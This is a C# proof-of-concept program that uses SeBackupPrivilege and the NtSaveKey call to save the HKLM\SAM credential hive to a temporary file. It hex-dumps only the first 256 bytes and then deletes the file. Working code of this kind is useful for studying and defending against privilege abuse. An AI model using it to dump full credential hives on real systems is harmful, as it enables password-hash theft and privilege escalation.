using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SeBackupPrivilegePoC
{
    class SeBackupPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,
            MaximumAllowed = 0x2000000,

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,
            FILE_LIST_DIRECTORY = 0x0001,
            FILE_WRITE_DATA = 0x0002,
            FILE_ADD_FILE = 0x0002,
            FILE_APPEND_DATA = 0x0004,
            FILE_ADD_SUBDIRECTORY = 0x0004,
            FILE_CREATE_PIPE_INSTANCE = 0x0004,
            FILE_READ_EA = 0x0008,
            FILE_WRITE_EA = 0x0010,
            FILE_EXECUTE = 0x0020,
            FILE_TRAVERSE = 0x0020,
            FILE_DELETE_CHILD = 0x0040,
            FILE_READ_ATTRIBUTES = 0x0080,
            FILE_WRITE_ATTRIBUTES = 0x0100,

            GenericRead = 0x80000000,
            GenericWrite = 0x40000000,
            GenericExecute = 0x20000000,
            GenericAll = 0x10000000,
            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS =
                StandardRightsRequired |
                Synchronize |
                0x1FF,
            FILE_GENERIC_READ =
                StandardRightsRead |
                FILE_READ_DATA |
                FILE_READ_ATTRIBUTES |
                FILE_READ_EA |
                Synchronize,
            FILE_GENERIC_WRITE =
                StandardRightsWrite |
                FILE_WRITE_DATA |
                FILE_WRITE_ATTRIBUTES |
                FILE_WRITE_EA |
                FILE_APPEND_DATA |
                Synchronize,
            FILE_GENERIC_EXECUTE =
                StandardRightsExecute |
                FILE_READ_ATTRIBUTES |
                FILE_EXECUTE |
                Synchronize
        }

        [Flags]
        enum EFileShare : uint
        {
            None = 0x00000000,
            Read = 0x00000001,
            Write = 0x00000002,
            Delete = 0x00000004
        }

        enum ECreationDisposition : uint
        {
            New = 1,
            CreateAlways = 2,
            OpenExisting = 3,
            OpenAlways = 4,
            TruncateExisting = 5
        }

        [Flags]
        enum EFileAttributes : uint
        {
            Readonly = 0x00000001,
            Hidden = 0x00000002,
            System = 0x00000004,
            Directory = 0x00000010,
            Archive = 0x00000020,
            Device = 0x00000040,
            Normal = 0x00000080,
            Temporary = 0x00000100,
            SparseFile = 0x00000200,
            ReparsePoint = 0x00000400,
            Compressed = 0x00000800,
            Offline = 0x00001000,
            NotContentIndexed = 0x00002000,
            Encrypted = 0x00004000,
            Write_Through = 0x80000000,
            Overlapped = 0x40000000,
            NoBuffering = 0x20000000,
            RandomAccess = 0x10000000,
            SequentialScan = 0x08000000,
            DeleteOnClose = 0x04000000,
            BackupSemantics = 0x02000000,
            PosixSemantics = 0x01000000,
            OpenReparsePoint = 0x00200000,
            OpenNoRecall = 0x00100000,
            FirstPipeInstance = 0x00080000
        }

        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES : IDisposable
        {
            public int Length;
            public IntPtr RootDirectory;
            private IntPtr objectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public OBJECT_ATTRIBUTES(string name, uint attrs)
            {
                Length = 0;
                RootDirectory = IntPtr.Zero;
                objectName = IntPtr.Zero;
                Attributes = attrs;
                SecurityDescriptor = IntPtr.Zero;
                SecurityQualityOfService = IntPtr.Zero;

                Length = Marshal.SizeOf(this);
                ObjectName = new UNICODE_STRING(name);
            }

            public UNICODE_STRING ObjectName
            {
                get
                {
                    return (UNICODE_STRING)Marshal.PtrToStructure(
                     objectName, typeof(UNICODE_STRING));
                }

                set
                {
                    bool fDeleteOld = objectName != IntPtr.Zero;
                    if (!fDeleteOld)
                        objectName = Marshal.AllocHGlobal(Marshal.SizeOf(value));
                    Marshal.StructureToPtr(value, objectName, fDeleteOld);
                }
            }

            public void Dispose()
            {
                if (objectName != IntPtr.Zero)
                {
                    Marshal.DestroyStructure(objectName, typeof(UNICODE_STRING));
                    Marshal.FreeHGlobal(objectName);
                    objectName = IntPtr.Zero;
                }
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public void SetBuffer(IntPtr _buffer)
            {
                buffer = _buffer;
            }

            public override string ToString()
            {
                if ((Length == 0) || (buffer == IntPtr.Zero))
                    return null;
                else
                    return Marshal.PtrToStringUni(buffer, Length / 2);
            }
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(
            string lpFileName,
            EFileAccess dwDesiredAccess,
            EFileShare dwShareMode,
            IntPtr lpSecurityAttributes,
            ECreationDisposition dwCreationDisposition,
            EFileAttributes dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("ntdll.dll")]
        static extern int NtClose(IntPtr hObject);

        [DllImport("ntdll.dll")]
        static extern int NtOpenKey(
            out IntPtr KeyHandle,
            uint DesiredAccess,
            in OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll")]
        static extern int NtSaveKey(
            IntPtr KeyHandle,
            IntPtr FileHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(
            IntPtr hFile,
            IntPtr lpBuffer,
            int nNumberOfBytesToRead,
            IntPtr lpNumberOfBytesRead,
            IntPtr lpOverlapped);

        /*
         * Windows Consts
         */
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        const int STATUS_SUCCESS = 0;
        const uint OBJ_CASE_INSENSITIVE = 0x40;
        const uint KEY_READ = 0X20019;

        /*
         * User defined functions
         */
        static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        static bool ReadBytesFromFile(IntPtr hFile, int nSize, out List<byte> data)
        {
            int error;
            var status = false;
            data = new List<byte>();

            do
            {
                if (nSize < 0)
                    break;

                IntPtr pBuffer = Marshal.AllocHGlobal(nSize);
                status = ReadFile(hFile, pBuffer, nSize, IntPtr.Zero, IntPtr.Zero);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to read file.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                }
                else
                {
                    for (var offset = 0; offset < nSize; offset++)
                    {
                        data.Add(Marshal.ReadByte(pBuffer, offset));
                    }
                }

                Marshal.FreeHGlobal(pBuffer);
            } while (false);

            return status;
        }



        static bool DumpSamHivePartial(int nSize)
        {
            int error;
            int ntstatus;
            IntPtr hFile;
            string filePath = Path.GetTempFileName();
            var objectAttributes = new OBJECT_ATTRIBUTES(@"\Registry\Machine\SAM", OBJ_CASE_INSENSITIVE);
            var status = false;

            do
            {
                Console.WriteLine("[>] Trying to create temporary file.");
                Console.WriteLine("    |-> File Path : {0}", filePath);

                hFile = CreateFile(
                    filePath,
                    EFileAccess.GenericRead | EFileAccess.GenericWrite,
                    EFileShare.None,
                    IntPtr.Zero,
                    ECreationDisposition.CreateAlways,
                    EFileAttributes.Normal | EFileAttributes.DeleteOnClose,
                    IntPtr.Zero);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create temporary file.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] The temporary file is created successfully (hFile = 0x{0}).", hFile.ToString("X"));
                }

                Console.WriteLine("[>] Trying to open HKLM\\SAM.");

                ntstatus = NtOpenKey(out IntPtr hKey, KEY_READ, in objectAttributes);

                if (ntstatus != STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to open registry key.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] HKLM\\SAM is opened successfully (hKey = 0x{0}).", hKey.ToString("X"));
                }

                Console.WriteLine("[>] Trying to save HKLM\\SAM to {0}.", filePath);

                ntstatus = NtSaveKey(hKey, hFile);

                if (ntstatus != STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to save registry key.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] HKLM\\SAM is saved successfully.");
                    Console.WriteLine("[>] Trying to read the saved HKLM\\SAM.");

                    status = ReadBytesFromFile(hFile, nSize, out List<byte> data);

                    if (data.Count > 0)
                    {
                        Console.WriteLine("[+] Dumped HKLM\\SAM (Top {0} bytes):\n", nSize);
                        HexDump.Dump(data.ToArray(), 1);
                    }
                }

                NtClose(hKey);
            } while (false);

            if (hFile != INVALID_HANDLE_VALUE)
                NtClose(hFile);

            if (File.Exists(filePath))
                File.Delete(filePath);

            return status;
        }


        static void Main()
        {
            int nSize = 0x100;
            Console.WriteLine("[*] If you have SeBackupPrivilege, you can read privileged files and registries in the system.");
            Console.WriteLine("[*] This PoC tries to read top {0} bytes from HKLM\\SAM.", nSize);

            DumpSamHivePartial(nSize);
        }
    }
}
